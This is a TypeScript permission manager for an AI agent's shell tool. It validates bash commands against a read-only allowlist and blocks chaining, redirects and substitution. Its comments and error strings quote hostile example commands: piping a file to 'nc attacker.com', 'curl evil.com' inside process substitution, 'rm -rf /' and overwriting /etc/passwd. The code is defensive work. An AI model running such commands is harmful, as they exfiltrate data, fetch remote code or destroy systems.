/**
 * Centralized Permission Mode Manager
 *
 * Manages agent permission modes for tool execution.
 * Each session has its own mode state - no global state contamination.
 *
 * Available Permission Modes:
 * - 'safe': Read-only exploration mode (blocks writes, never prompts)
 * - 'ask': Ask for permission on dangerous operations (default interactive behavior)
 * - 'allow-all': Skip all permission checks (everything allowed)
 */

/// <reference path="../types/incr-regex-package.d.ts" />

import { homedir } from 'os';
import { parse as parseShellCommand, type ParseEntry } from 'shell-quote';
import { debug } from '../utils/debug.ts';
import type { PermissionsContext, MergedPermissionsConfig } from './permissions-config.ts';
import {
  validateBashCommand,
  hasControlCharacters,
  type BashValidationResult,
  type BashValidationReason,
} from './bash-validator.ts';
import {
  type PermissionMode,
  type ModeConfig,
  type CompiledApiEndpointRule,
  type CompiledBashPattern,
  type MismatchAnalysis,
  PERMISSION_MODE_ORDER,
  PERMISSION_MODE_CONFIG,
  SAFE_MODE_CONFIG,
} from './mode-types.ts';

// Import incr-regex-package for smart pattern mismatch diagnostics
// This library allows character-by-character matching to find WHERE a regex match failed
import { IREGEX, DONE, MORE, FAILED } from 'incr-regex-package';

// Re-export types and config from mode-types (single source of truth)
export {
  type PermissionMode,
  type ModeConfig,
  type CompiledApiEndpointRule,
  type CompiledBashPattern,
  type MismatchAnalysis,
  PERMISSION_MODE_ORDER,
  PERMISSION_MODE_CONFIG,
  SAFE_MODE_CONFIG,
};

/**
 * State for a single session's permission mode
 */
export interface ModeState {
  /** Session ID */
  sessionId: string;
  /** Current permission mode */
  permissionMode: PermissionMode;
  /** Callback when mode state changes */
  onStateChange?: (state: ModeState) => void;
}

/**
 * Callbacks for mode changes
 */
export interface ModeCallbacks {
  onStateChange?: (state: ModeState) => void;
}

// ============================================================
// Path Matching Utilities
// ============================================================

/**
 * Expand ~ to home directory
 */
function expandHome(path: string): string {
  if (path.startsWith('~/') || path === '~') {
    return path.replace(/^~/, homedir());
  }
  return path;
}

/**
 * Convert a simple glob pattern to a regex
 * Supports: ** (recursive), * (single segment), ? (single char)
 */
function globToRegex(pattern: string): RegExp {
  // Expand ~ in pattern
  const expandedPattern = expandHome(pattern);

  // Escape special regex chars except glob wildcards
  let regex = expandedPattern
    .replace(/[.+^${}()|[\]\\]/g, '\\$&')  // Escape regex special chars
    .replace(/\*\*/g, '\0DOUBLE_STAR\0')   // Temporarily replace **
    .replace(/\*/g, '[^/]*')                // * matches single path segment
    .replace(/\0DOUBLE_STAR\0/g, '.*')      // ** matches anything including /
    .replace(/\?/g, '.');                   // ? matches single char

  return new RegExp(`^${regex}$`);
}

/**
 * Check if a path matches any of the allowed write path patterns
 */
function matchesAllowedWritePath(filePath: string, allowedPaths: string[]): boolean {
  // Normalize path (expand ~ and use forward slashes)
  const normalizedPath = expandHome(filePath).replace(/\\/g, '/');

  for (const pattern of allowedPaths) {
    try {
      const regex = globToRegex(pattern);
      if (regex.test(normalizedPath)) {
        debug(`[Mode] Path "${normalizedPath}" matches allowed pattern "${pattern}"`);
        return true;
      }
    } catch (e) {
      debug(`[Mode] Invalid glob pattern "${pattern}":`, e);
    }
  }
  return false;
}

// ============================================================
// Mode Manager Class
// ============================================================

/**
 * Manager for per-session permission mode state.
 * Each session has its own state - NO GLOBAL STATE.
 */
class ModeManager {
  private states: Map<string, ModeState> = new Map();
  private callbacks: Map<string, ModeCallbacks> = new Map();
  private subscribers: Map<string, Set<() => void>> = new Map();

  /**
   * Get or create state for a session
   */
  getState(sessionId: string): ModeState {
    let state = this.states.get(sessionId);
    if (!state) {
      state = {
        sessionId,
        permissionMode: 'ask', // Default to 'ask' until initialized
      };
      this.states.set(sessionId, state);
    }
    return state;
  }

  /**
   * Set permission mode for a session
   */
  setPermissionMode(sessionId: string, mode: PermissionMode): void {
    const existing = this.getState(sessionId);
    const newState = { ...existing, permissionMode: mode };
    this.states.set(sessionId, newState);

    debug(`[Mode] Set permission mode to ${mode} for session ${sessionId}`);

    // Notify callbacks (for CraftAgent internal sync)
    const callbacks = this.callbacks.get(sessionId);
    if (callbacks?.onStateChange) {
      callbacks.onStateChange(newState);
    }

    // Notify React subscribers (for useSyncExternalStore)
    this.subscribers.get(sessionId)?.forEach(cb => cb());
  }

  /**
   * Register callbacks for a session
   */
  registerCallbacks(sessionId: string, callbacks: ModeCallbacks): void {
    this.callbacks.set(sessionId, callbacks);
  }

  /**
   * Unregister callbacks for a session
   */
  unregisterCallbacks(sessionId: string): void {
    this.callbacks.delete(sessionId);
  }

  /**
   * Clean up a session's state
   */
  cleanupSession(sessionId: string): void {
    this.states.delete(sessionId);
    this.callbacks.delete(sessionId);
    this.subscribers.delete(sessionId);
  }

  /**
   * Subscribe to mode changes for a session (for React useSyncExternalStore)
   * Returns an unsubscribe function
   */
  subscribe(sessionId: string, callback: () => void): () => void {
    if (!this.subscribers.has(sessionId)) {
      this.subscribers.set(sessionId, new Set());
    }
    this.subscribers.get(sessionId)!.add(callback);

    // Return unsubscribe function
    return () => {
      this.subscribers.get(sessionId)?.delete(callback);
    };
  }
}

// Singleton manager instance
export const modeManager = new ModeManager();

// ============================================================
// Permission Mode API
// ============================================================

/**
 * Get the current permission mode for a session
 */
export function getPermissionMode(sessionId: string): PermissionMode {
  return modeManager.getState(sessionId).permissionMode;
}

/**
 * Set the permission mode for a session
 */
export function setPermissionMode(sessionId: string, mode: PermissionMode): void {
  modeManager.setPermissionMode(sessionId, mode);
}

/**
 * Cycle to the next permission mode (for SHIFT+TAB)
 * @param sessionId - The session to cycle mode for
 * @param enabledModes - Optional list of enabled modes to cycle through (defaults to all 3)
 * Returns the new mode
 */
export function cyclePermissionMode(
  sessionId: string,
  enabledModes?: PermissionMode[]
): PermissionMode {
  const currentMode = getPermissionMode(sessionId);
  // Use provided modes or default to all modes
  const modes = enabledModes && enabledModes.length >= 2 ? enabledModes : PERMISSION_MODE_ORDER;
  const currentIndex = modes.indexOf(currentMode);

  // If current mode not in enabled list, jump to first enabled mode
  if (currentIndex === -1) {
    const nextMode = modes[0] ?? 'ask';
    setPermissionMode(sessionId, nextMode);
    return nextMode;
  }

  const nextIndex = (currentIndex + 1) % modes.length;
  // Safe assertion: nextIndex is always valid due to modulo operation
  const nextMode = modes[nextIndex] as PermissionMode;
  setPermissionMode(sessionId, nextMode);
  return nextMode;
}

/**
 * Subscribe to mode changes for a session (for React useSyncExternalStore)
 * Returns an unsubscribe function
 */
export function subscribeModeChanges(sessionId: string, callback: () => void): () => void {
  return modeManager.subscribe(sessionId, callback);
}

/**
 * Get mode state for a session
 */
export function getModeState(sessionId: string): ModeState {
  return modeManager.getState(sessionId);
}

/**
 * Initialize permission mode state for a session with callbacks
 */
export function initializeModeState(
  sessionId: string,
  initialMode: PermissionMode | { permissionMode?: PermissionMode },
  callbacks?: ModeCallbacks
): void {
  let mode: PermissionMode;

  if (typeof initialMode === 'string') {
    mode = initialMode;
  } else if ('permissionMode' in initialMode && initialMode.permissionMode) {
    mode = initialMode.permissionMode;
  } else {
    // Default to 'ask' if not specified
    mode = 'ask';
  }

  // IMPORTANT: Register callbacks BEFORE setting mode so the initial
  // state change triggers the callback.
  if (callbacks) {
    modeManager.registerCallbacks(sessionId, callbacks);
  }
  modeManager.setPermissionMode(sessionId, mode);
}

/**
 * Clean up mode state for a session
 */
export function cleanupModeState(sessionId: string): void {
  modeManager.cleanupSession(sessionId);
}

// ============================================================
// Tool Blocking Logic (Centralized)
// ============================================================

/**
 * Config type that works with both ModeConfig and MergedPermissionsConfig
 */
type ToolCheckConfig = ModeConfig | MergedPermissionsConfig;

// ============================================================
// Command Chaining Detection (Security)
// ============================================================

/**
 * Operators that chain multiple commands together.
 * These are dangerous because they allow executing arbitrary commands
 * after a "safe" prefix like: `ls && rm -rf /`
 */
export const DANGEROUS_CHAIN_OPERATORS = new Set([
  '&&',   // AND - second command runs if first succeeds
  '||',   // OR - second command runs if first fails
  ';',    // Sequence - always runs second command
  '|',    // Pipe - connects stdout to stdin (can chain to dangerous commands)
  '&',    // Background - runs command in background
  '|&',   // Pipe stderr - bash extension
]);

/**
 * Operators that write to files.
 * These are dangerous because they can overwrite/modify files.
 */
export const DANGEROUS_REDIRECT_OPERATORS = new Set([
  '>',    // Overwrite file
  '>>',   // Append to file
  '>&',   // Redirect stderr to file
]);

/**
 * Extract the operator string from a shell-quote operator token.
 * shell-quote returns operators as objects with an `op` property.
 * Returns undefined if not an operator.
 */
function getOperator(token: ParseEntry): string | undefined {
  if (typeof token === 'object' && token !== null && 'op' in token) {
    return token.op;
  }
  return undefined;
}

/**
 * Check if a command contains dangerous shell operators (command chaining or redirects).
 *
 * This prevents attacks like:
 * - `ls && rm -rf /` (command chaining)
 * - `cat file | nc attacker.com 1234` (piping to network)
 * - `echo "data" > /etc/passwd` (file overwrite)
 *
 * Uses shell-quote to properly parse the command, handling edge cases like:
 * - Quoted strings: `ls "&&"` is safe (the && is a literal string)
 * - Escaped chars: `ls \&\&` is safe (escaped)
 *
 * @param command - The bash command to check
 * @returns true if command contains dangerous operators, false if safe
 */
export function hasDangerousShellOperators(command: string): boolean {
  try {
    const parsed = parseShellCommand(command);

    for (const token of parsed) {
      const op = getOperator(token);
      if (op) {
        if (DANGEROUS_CHAIN_OPERATORS.has(op)) {
          debug(`[Mode] Dangerous chain operator detected: "${op}" in command: ${command}`);
          return true;
        }
        if (DANGEROUS_REDIRECT_OPERATORS.has(op)) {
          debug(`[Mode] Dangerous redirect operator detected: "${op}" in command: ${command}`);
          return true;
        }
      }
    }

    return false;
  } catch (error) {
    // Parse error - assume dangerous (fail closed)
    debug(`[Mode] Shell parse error for command "${command}":`, error);
    return true;
  }
}

/**
 * Control characters that act as command separators or could be used for injection.
 * These are dangerous because they can terminate the "safe" command and start a new one.
 */
const DANGEROUS_CONTROL_CHARS = new Set([
  '\n',    // Newline - acts as command separator in bash
  '\r',    // Carriage return - can act as newline
  '\x00',  // Null byte - can truncate strings in some contexts
]);

/**
 * Check if a command contains dangerous control characters.
 *
 * Newlines and carriage returns act as command separators in bash:
 * - `ls\nrm -rf /` executes both ls and rm
 *
 * @param command - The bash command to check
 * @returns true if command contains dangerous control chars, false if safe
 */
export function hasDangerousControlChars(command: string): boolean {
  for (const char of command) {
    if (DANGEROUS_CONTROL_CHARS.has(char)) {
      debug(`[Mode] Dangerous control character detected (code ${char.charCodeAt(0)}) in command`);
      return true;
    }
  }
  return false;
}

/**
 * Check if a command contains dangerous command/process substitution patterns.
 *
 * Detects:
 * - Command substitution: $(...) or `...` (backticks)
 * - Process substitution: <(...) or >(...)
 *
 * These are dangerous because they execute arbitrary commands:
 * - `ls $(rm -rf /)` - the rm runs during argument expansion
 * - `echo "$(cat /etc/passwd)"` - executes even inside double quotes
 * - `cat <(curl http://evil.com)` - process substitution runs curl
 *
 * Note: Single-quoted strings are safe: `echo '$(rm)'` is literal text
 *
 * @param command - The bash command to check
 * @returns true if command contains dangerous substitution, false if safe
 */
export function hasDangerousSubstitution(command: string): boolean {
  let inSingleQuote = false;
  let escaped = false;

  for (let i = 0; i < command.length; i++) {
    const char = command[i];
    const nextChar = command[i + 1];

    // Handle escape sequences (only outside single quotes)
    if (escaped) {
      escaped = false;
      continue;
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true;
      continue;
    }

    // Track single quote state (double quotes don't protect against substitution)
    if (char === "'" && !escaped) {
      inSingleQuote = !inSingleQuote;
      continue;
    }

    // Only check for dangerous patterns outside single quotes
    if (!inSingleQuote) {
      // Command substitution: $(
      if (char === '$' && nextChar === '(') {
        debug(`[Mode] Command substitution $() detected in: ${command}`);
        return true;
      }

      // Backtick command substitution
      if (char === '`') {
        debug(`[Mode] Backtick substitution detected in: ${command}`);
        return true;
      }

      // Process substitution: <( or >(
      if ((char === '<' || char === '>') && nextChar === '(') {
        debug(`[Mode] Process substitution detected in: ${command}`);
        return true;
      }
    }
  }

  return false;
}

// ============================================================
// Bash Rejection Reasons (Detailed error messages)
// ============================================================

/**
 * Pattern info for error messages - shows what patterns might have matched
 */
export interface RelevantPatternInfo {
  source: string;
  comment?: string;
}

/**
 * Detailed reason why a bash command was rejected in Explore mode.
 * Used to provide helpful error messages that explain exactly what was blocked and why.
 */
export type BashRejectionReason =
  | { type: 'control_char'; char: string; charCode: number; explanation: string }
  | { type: 'no_safe_pattern'; command: string; relevantPatterns: RelevantPatternInfo[]; mismatchAnalysis?: MismatchAnalysis }
  | { type: 'dangerous_operator'; operator: string; operatorType: 'chain' | 'redirect'; explanation: string }
  | { type: 'dangerous_substitution'; pattern: string; explanation: string }
  | { type: 'parse_error'; error: string }
  // New AST-based rejection types (from bash-validator)
  | { type: 'pipeline'; explanation: string }
  | { type: 'redirect'; op: string; explanation: string }
  | { type: 'command_expansion'; explanation: string }
  | { type: 'process_substitution'; explanation: string }
  | { type: 'unsafe_command'; command: string; explanation: string }
  | { type: 'compound_partial_fail'; failedCommands: string[]; passedCommands: string[] };

/**
 * Human-readable explanations for dangerous operators.
 * These help the agent understand why specific operators are blocked.
 */
const OPERATOR_EXPLANATIONS: Record<string, string> = {
  // Note: &&, ||, and | are now validated per-command via AST, not blocked outright.
  // These explanations are kept for legacy error messages but should rarely be hit.
  '&&': 'runs second command if first succeeds (e.g., `safe && dangerous`)',
  '||': 'runs second command if first fails (e.g., `safe || dangerous`)',
  ';': 'always runs second command regardless of first (e.g., `safe; dangerous`)',
  '&': 'runs command in background, allowing additional commands',
  // Redirect operators
  '>': 'overwrites file contents (e.g., `echo data > /etc/passwd`)',
  '>>': 'appends to file (e.g., `echo data >> ~/.bashrc`)',
  '>&': 'redirects stderr to a file',
};

/**
 * Human-readable explanations for control characters.
 */
const CONTROL_CHAR_EXPLANATIONS: Record<string, string> = {
  '\n': 'newline acts as command separator in bash (e.g., `safe\\ndangerous` runs both)',
  '\r': 'carriage return can act as command separator',
  '\x00': 'null byte can truncate strings and cause unexpected behavior',
};

/**
 * Find the first dangerous control character in a command.
 * Returns details about the character if found, null otherwise.
 */
function findDangerousControlChar(command: string): { char: string; charCode: number; explanation: string } | null {
  for (const char of command) {
    if (DANGEROUS_CONTROL_CHARS.has(char)) {
      const charCode = char.charCodeAt(0);
      const displayChar = char === '\n' ? '\\n' : char === '\r' ? '\\r' : char === '\x00' ? '\\0' : `\\x${charCode.toString(16).padStart(2, '0')}`;
      const explanation = CONTROL_CHAR_EXPLANATIONS[char] ?? `control character (code ${charCode}) can cause unexpected behavior`;
      return { char: displayChar, charCode, explanation };
    }
  }
  return null;
}

/**
 * Find the first dangerous shell operator in a command.
 * Returns details about the operator if found, null otherwise.
 */
function findDangerousOperator(command: string): { operator: string; operatorType: 'chain' | 'redirect'; explanation: string } | null {
  try {
    const parsed = parseShellCommand(command);

    for (const token of parsed) {
      const op = getOperator(token);
      if (op) {
        if (DANGEROUS_CHAIN_OPERATORS.has(op)) {
          return {
            operator: op,
            operatorType: 'chain',
            explanation: OPERATOR_EXPLANATIONS[op] ?? 'allows command chaining',
          };
        }
        if (DANGEROUS_REDIRECT_OPERATORS.has(op)) {
          return {
            operator: op,
            operatorType: 'redirect',
            explanation: OPERATOR_EXPLANATIONS[op] ?? 'allows file redirection',
          };
        }
      }
    }
    return null;
  } catch {
    // Parse error handled separately
    return null;
  }
}

/**
 * Find dangerous command/process substitution in a command.
 * Returns details about the pattern if found, null otherwise.
 */
function findDangerousSubstitution(command: string): { pattern: string; explanation: string } | null {
  let inSingleQuote = false;
  let escaped = false;

  for (let i = 0; i < command.length; i++) {
    const char = command[i];
    const nextChar = command[i + 1];

    if (escaped) {
      escaped = false;
      continue;
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true;
      continue;
    }

    if (char === "'" && !escaped) {
      inSingleQuote = !inSingleQuote;
      continue;
    }

    if (!inSingleQuote) {
      if (char === '$' && nextChar === '(') {
        return {
          pattern: '$()',
          explanation: 'command substitution executes embedded commands during expansion (e.g., `ls $(rm -rf /)`)',
        };
      }

      if (char === '`') {
        return {
          pattern: '`...`',
          explanation: 'backtick substitution executes embedded commands (e.g., `echo \\`rm -rf /\\``)',
        };
      }

      if (char === '<' && nextChar === '(') {
        return {
          pattern: '<()',
          explanation: 'process substitution executes commands and provides output as a file (e.g., `cat <(curl evil.com)`)',
        };
      }

      if (char === '>' && nextChar === '(') {
        return {
          pattern: '>()',
          explanation: 'process substitution executes commands with input from a file descriptor',
        };
      }
    }
  }

  return null;
}

/**
 * Find patterns that might be relevant to the attempted command.
 * Extracts the first word (command name) and finds patterns containing it.
 * This helps provide actionable error messages when a command is blocked.
 *
 * For example, if the command is "git -C /path status", this will find
 * the git pattern and show the agent what format is expected.
 */
function findRelevantPatterns(command: string, patterns: CompiledBashPattern[]): RelevantPatternInfo[] {
  // Extract the first word (command name) from the command
  const firstWord = command.trim().split(/\s+/)[0]?.toLowerCase();
  if (!firstWord) return [];

  // Find patterns whose source contains the command name
  // This catches patterns like "^git\s+(status|log|...)" when command starts with "git"
  const relevant: RelevantPatternInfo[] = [];

  for (const pattern of patterns) {
    // Check if the pattern source contains the command name
    // Use case-insensitive matching and look for the command at word boundaries
    const sourceLower = pattern.source.toLowerCase();
    if (
      sourceLower.includes(firstWord) ||
      sourceLower.startsWith(`^${firstWord}`)
    ) {
      relevant.push({
        source: pattern.source,
        comment: pattern.comment,
      });
    }
  }

  // Limit to top 3 most relevant patterns to avoid overwhelming the agent
  return relevant.slice(0, 3);
}

/**
 * Analyze WHY a command didn't match any pattern using incremental regex matching.
 * Uses incr-regex-package to find exactly WHERE in the command matching stopped,
 * which helps generate actionable error messages.
 *
 * For example, if the command is "git -C /path status" and the pattern is
 * "^git\s+(status|log|diff)", this will detect that matching stopped at "-C"
 * and suggest running from within the repo directory instead.
 */
function analyzePatternMismatch(command: string, patterns: CompiledBashPattern[]): MismatchAnalysis | null {
  const trimmedCommand = command.trim();
  if (!trimmedCommand) return null;

  // Find the pattern that matches the longest prefix of the command
  // This gives us the "best match" to analyze
  let bestMatch: {
    matchedCount: number;
    matchedPrefix: string;
    pattern: CompiledBashPattern;
  } | null = null;

  for (const pattern of patterns) {
    try {
      // Simplify the pattern for incr-regex: remove anchors and word boundaries
      // which aren't supported by the incremental matching library.
      // This is fine since we only use it for diagnostic purposes.
      const simplifiedPattern = pattern.source
        .replace(/^\^/, '')     // Remove start anchor
        .replace(/\$$/g, '')    // Remove end anchor
        .replace(/\\b/g, '');   // Remove word boundaries

      // Create incremental regex matcher from the simplified pattern
      // IREGEX is a class that takes a regex pattern string in its constructor
      const incr = new IREGEX(simplifiedPattern);

      // Use matchStr to process the entire command and get match info
      // Returns [success, charCount, matchedString]
      const [_success, charCount, matchedStr] = incr.matchStr(trimmedCommand);

      // Track the pattern that matched the most characters (best partial match)
      if (charCount > 0 && (!bestMatch || charCount > bestMatch.matchedCount)) {
        bestMatch = {
          matchedCount: charCount,
          matchedPrefix: matchedStr || trimmedCommand.substring(0, charCount),
          pattern,
        };
      }
    } catch {
      // If incr-regex can't parse the pattern (complex regex features),
      // skip this pattern - we'll fall back to basic diagnostics
      continue;
    }
  }

  // If no pattern matched anything, return null (unknown command)
  if (!bestMatch || bestMatch.matchedCount === 0) {
    return null;
  }

  // Analyze what token caused the mismatch
  const failedPosition = bestMatch.matchedCount;
  const remainingCommand = trimmedCommand.substring(failedPosition).trim();
  const failedToken = remainingCommand.split(/\s+/)[0] || '';

  // Generate a helpful suggestion based on what we found
  const suggestion = generateMismatchSuggestion(
    trimmedCommand,
    bestMatch.matchedPrefix,
    failedToken,
    bestMatch.pattern
  );

  return {
    matchedPrefix: bestMatch.matchedPrefix,
    failedAtPosition: failedPosition,
    failedToken,
    bestMatchPattern: {
      source: bestMatch.pattern.source,
      comment: bestMatch.pattern.comment,
    },
    suggestion,
  };
}

/**
 * Generate an actionable suggestion based on pattern mismatch analysis.
 * Looks for common patterns like flags before subcommands in git/gh/docker.
 */
function generateMismatchSuggestion(
  command: string,
  matchedPrefix: string,
  failedToken: string,
  pattern: CompiledBashPattern
): string | undefined {
  const firstWord = command.split(/\s+/)[0]?.toLowerCase();

  // Detect "flags before subcommand" pattern for git, gh, docker, kubectl
  const commandsWithSubcommands = ['git', 'gh', 'docker', 'kubectl', 'npm', 'yarn', 'cargo'];
  if (
    commandsWithSubcommands.includes(firstWord || '') &&
    failedToken.startsWith('-')
  ) {
    // The command has a flag where a subcommand was expected
    // Try to find the actual subcommand later in the command
    const words = command.split(/\s+/);
    const subcommandCandidates = words.slice(1).filter(w => !w.startsWith('-') && !w.includes('/'));

    if (subcommandCandidates.length > 0) {
      const likelySubcommand = subcommandCandidates[0];
      return `The pattern expects \`${firstWord} <subcommand>\` directly, but found flag \`${failedToken}\` first. ` +
        `Try running from within the target directory, or use: \`${firstWord} ${likelySubcommand} ...\``;
    }

    return `The pattern expects a subcommand after \`${firstWord}\`, but found flag \`${failedToken}\`. ` +
      `Run from the target directory or switch to Ask/Execute mode.`;
  }

  // Detect possible typos in subcommands using simple heuristics
  // (Check if failedToken is close to any word in the pattern)
  if (pattern.comment && !failedToken.startsWith('-')) {
    // Extract subcommand options from pattern comment if present
    // e.g., "Git read-only operations: view status, history, branches, diffs"
    const commentLower = pattern.comment.toLowerCase();
    const failedTokenLower = failedToken.toLowerCase();

    // Check for common subcommand names in the comment
    const commonSubcommands = ['status', 'log', 'diff', 'show', 'branch', 'list', 'view', 'get', 'describe'];
    for (const sub of commonSubcommands) {
      // Simple Levenshtein-ish check: if token is within 2 chars of a known subcommand
      if (
        commentLower.includes(sub) &&
        Math.abs(failedTokenLower.length - sub.length) <= 2 &&
        failedTokenLower !== sub
      ) {
        // Check if first 2 chars match (simple typo detection)
        if (failedTokenLower.substring(0, 2) === sub.substring(0, 2)) {
          return `Did you mean \`${firstWord} ${sub}\` instead of \`${firstWord} ${failedToken}\`?`;
        }
      }
    }
  }

  // Generic fallback
  return undefined;
}

/**
 * Get detailed reason why a bash command would be rejected.
 * Returns null if the command is safe, otherwise returns the specific reason.
 *
 * Uses AST-based validation for compound commands (&&, ||, ;) to allow
 * safe compound commands like `git status && git log` while still blocking
 * dangerous constructs.
 *
 * This is used to provide helpful error messages that explain exactly what
 * was blocked and why, helping the agent understand and avoid the issue.
 */
export function getBashRejectionReason(command: string, config: ToolCheckConfig): BashRejectionReason | null {
  const trimmedCommand = command.trim();

  // Step 1: Check for dangerous control characters (before parsing)
  // These could affect parsing itself, so check first
  const controlChar = hasControlCharacters(trimmedCommand);
  if (controlChar) {
    return {
      type: 'control_char',
      char: controlChar.char,
      charCode: 0, // Not used in new flow, but kept for compatibility
      explanation: controlChar.explanation,
    };
  }

  // Step 2: Use AST-based validation
  // This handles compound commands, pipelines, redirects, and substitutions properly
  const astResult = validateBashCommand(trimmedCommand, config.readOnlyBashPatterns);

  if (astResult.allowed) {
    debug('[Mode] Command allowed via AST validation:', trimmedCommand);
    return null;
  }

  // Step 3: Convert AST rejection reason to BashRejectionReason
  if (astResult.reason) {
    const reason = astResult.reason;

    switch (reason.type) {
      case 'parse_error':
        return { type: 'parse_error', error: reason.error };

      case 'pipeline':
        // Convert to the legacy format for consistent error messages
        return {
          type: 'dangerous_operator',
          operator: '|',
          operatorType: 'chain',
          explanation: reason.explanation,
        };

      case 'redirect':
        return {
          type: 'dangerous_operator',
          operator: reason.op,
          operatorType: 'redirect',
          explanation: reason.explanation,
        };

      case 'command_expansion':
        return {
          type: 'dangerous_substitution',
          pattern: '$()',
          explanation: reason.explanation,
        };

      case 'process_substitution':
        return {
          type: 'dangerous_substitution',
          pattern: '<() or >()',
          explanation: reason.explanation,
        };

      case 'unsafe_command': {
        // Find relevant patterns to help the agent understand what format is expected
        const relevantPatterns = findRelevantPatterns(reason.command, config.readOnlyBashPatterns);
        const mismatchAnalysis = analyzePatternMismatch(reason.command, config.readOnlyBashPatterns);

        return {
          type: 'no_safe_pattern',
          command: reason.command,
          relevantPatterns,
          mismatchAnalysis: mismatchAnalysis ?? undefined,
        };
      }

      case 'compound_partial_fail':
        // Return info about which commands failed in a compound expression
        return {
          type: 'compound_partial_fail',
          failedCommands: reason.failedCommands,
          passedCommands: reason.passedCommands,
        };

      case 'background_execution':
        // Background execution with & operator - convert to dangerous_operator format
        return {
          type: 'dangerous_operator',
          operator: '&',
          operatorType: 'chain',
          explanation: reason.explanation,
        };
    }
  }

  // Fallback: shouldn't reach here, but return generic rejection if we do
  debug('[Mode] Unexpected: AST rejected but no reason provided');
  return {
    type: 'no_safe_pattern',
    command: trimmedCommand,
    relevantPatterns: [],
    mismatchAnalysis: undefined,
  };
}

/**
 * Format actionable guidance for permission customization.
 * Tells the agent where to read/modify permissions.
 */
function formatPermissionGuidance(config: ToolCheckConfig): string {
  const lines: string[] = [];

  // Only include guidance if permission paths are available
  if (config.permissionPaths) {
    lines.push('');
    lines.push('To see what commands are allowed in Explore mode, read:');
    lines.push(`  • ${config.permissionPaths.workspacePath}`);
    lines.push(`  • ${config.permissionPaths.appDefaultPath}`);
    lines.push('');
    lines.push('To understand the permission system and how to customize:');
    lines.push(`  • ${config.permissionPaths.docsPath}`);
  }

  return lines.join('\n');
}

/**
 * Format a bash rejection reason into a user-friendly error message.
 * The message explains what was blocked and why, helping the agent understand the issue.
 * Includes actionable guidance on how to customize permissions.
 */
export function formatBashRejectionMessage(reason: BashRejectionReason, config: ToolCheckConfig): string {
  const modeSwitchHint = `Switch to Ask or Allow All mode (${config.shortcutHint}) to run it.`;
  const permissionGuidance = formatPermissionGuidance(config);

  switch (reason.type) {
    case 'control_char':
      return `Bash command blocked: contains "${reason.char}" character. ${reason.explanation}. ${modeSwitchHint}`;

    case 'no_safe_pattern': {
      // Build a helpful message showing what patterns might be relevant
      const lines: string[] = [];
      lines.push(`Bash command \`${reason.command}\` is not in the read-only allowlist.`);

      // If we have mismatch analysis, show detailed diagnostics first (most helpful)
      if (reason.mismatchAnalysis) {
        const analysis = reason.mismatchAnalysis;
        lines.push('');

        // Show what matched and where it failed
        if (analysis.matchedPrefix) {
          lines.push(`Matched: \`${analysis.matchedPrefix}\` (${analysis.failedAtPosition} chars)`);
        }
        if (analysis.failedToken) {
          lines.push(`Failed at: \`${analysis.failedToken}\` (position ${analysis.failedAtPosition})`);
        }

        // Show the actionable suggestion if we have one
        if (analysis.suggestion) {
          lines.push('');
          lines.push(analysis.suggestion);
        }

        // Show which pattern was closest to matching
        if (analysis.bestMatchPattern?.comment) {
          lines.push('');
          lines.push(`Pattern: ${analysis.bestMatchPattern.comment}`);
        }
      } else if (reason.relevantPatterns.length > 0) {
        // Fall back to showing relevant patterns if no mismatch analysis
        lines.push('');
        lines.push('Relevant pattern(s) that might match:');
        for (const pattern of reason.relevantPatterns) {
          // Show the pattern regex (simplified for readability)
          const patternDisplay = pattern.source.length > 80
            ? pattern.source.substring(0, 77) + '...'
            : pattern.source;
          lines.push(`  Pattern: \`${patternDisplay}\``);
          if (pattern.comment) {
            lines.push(`  → ${pattern.comment}`);
          }
        }
        lines.push('');
        lines.push('The command must match the pattern exactly from the start.');
      }

      // Add permission guidance for pattern-based rejections
      lines.push(permissionGuidance);
      lines.push('');
      lines.push(modeSwitchHint);
      return lines.join('\n');
    }

    case 'dangerous_operator':
      return `Bash command blocked: contains "${reason.operator}" operator. This ${reason.explanation}. Run commands separately or switch to Ask mode.`;

    case 'dangerous_substitution':
      return `Bash command blocked: contains ${reason.pattern} syntax. ${reason.explanation}. ${modeSwitchHint}`;

    case 'parse_error':
      return `Bash command blocked: could not parse command safely (${reason.error}). ${modeSwitchHint}`;

    case 'compound_partial_fail': {
      // Some commands in a compound expression failed
      const lines: string[] = [];
      lines.push('Bash command blocked: compound command contains unsafe operations.');
      lines.push('');
      if (reason.passedCommands.length > 0) {
        lines.push('✓ Allowed commands:');
        for (const cmd of reason.passedCommands) {
          lines.push(`  • \`${cmd}\``);
        }
      }
      if (reason.failedCommands.length > 0) {
        lines.push('✗ Blocked commands (not in read-only allowlist):');
        for (const cmd of reason.failedCommands) {
          lines.push(`  • \`${cmd}\``);
        }
      }
      // Add permission guidance for compound command failures
      lines.push(permissionGuidance);
      lines.push('');
      lines.push(modeSwitchHint);
      return lines.join('\n');
    }

    // New AST-based types (shouldn't reach here as they're converted above, but handle for completeness)
    case 'pipeline':
      return `Bash command blocked: contains pipeline (|). ${reason.explanation}. ${modeSwitchHint}`;

    case 'redirect':
      return `Bash command blocked: contains "${reason.op}" redirect. This ${reason.explanation}. ${modeSwitchHint}`;

    case 'command_expansion':
      return `Bash command blocked: contains command substitution. ${reason.explanation}. ${modeSwitchHint}`;

    case 'process_substitution':
      return `Bash command blocked: contains process substitution. ${reason.explanation}. ${modeSwitchHint}`;

    case 'unsafe_command': {
      const lines: string[] = [];
      lines.push(`Bash command blocked: \`${reason.command}\` is not in the read-only allowlist.`);
      lines.push(permissionGuidance);
      lines.push('');
      lines.push(modeSwitchHint);
      return lines.join('\n');
    }
  }
}

/**
 * Check if a Bash command is read-only using the given config.
 *
 * Uses AST-based validation to properly handle compound commands like
 * `git status && git log` - each part is validated separately, and the
 * command is allowed only if ALL parts pass.
 *
 * A command is considered safe if:
 * 1. It does NOT contain dangerous control characters (newlines, etc.)
 * 2. All simple commands match read-only patterns (including in compound commands)
 * 3. It does NOT contain redirects (>, >>, <) - these modify files
 * 4. It does NOT contain command/process substitution ($(), ``, <(), >())
 * 5. It does NOT run in background (&)
 *
 * Compound commands (&&, ||, |) are allowed when ALL parts are safe:
 * - `git status && git log` is allowed (both commands are safe)
 * - `git log | head` is allowed (both commands are safe)
 *
 * This multi-step check prevents attacks like:
 * - `ls\nrm -rf /` (newline injection)
 * - `git status && rm -rf /` (dangerous command in chain - rm not in allowlist)
 * - `cat file | nc attacker.com` (nc not in allowlist)
 * - `ls $(rm -rf /)` (command substitution)
 */
/**
